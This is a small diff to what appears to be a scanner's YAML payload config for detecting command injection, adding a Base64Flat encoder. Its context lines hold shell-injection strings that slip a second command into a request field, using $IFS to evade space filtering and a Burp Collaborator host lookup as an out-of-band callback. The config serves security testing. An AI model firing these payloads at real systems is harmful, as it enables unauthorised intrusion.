@@ -7,6 +7,7 @@ payload:
   - ';getent$IFS$9hosts$IFS$9somehost.burpcollaborator.net;echo$IFS$9$((3482*7301));'
   - '| set /a 3482*7301'
 encoder:
+  - Base64Flat
   - URL
 placeholder:
   - JSONRequest
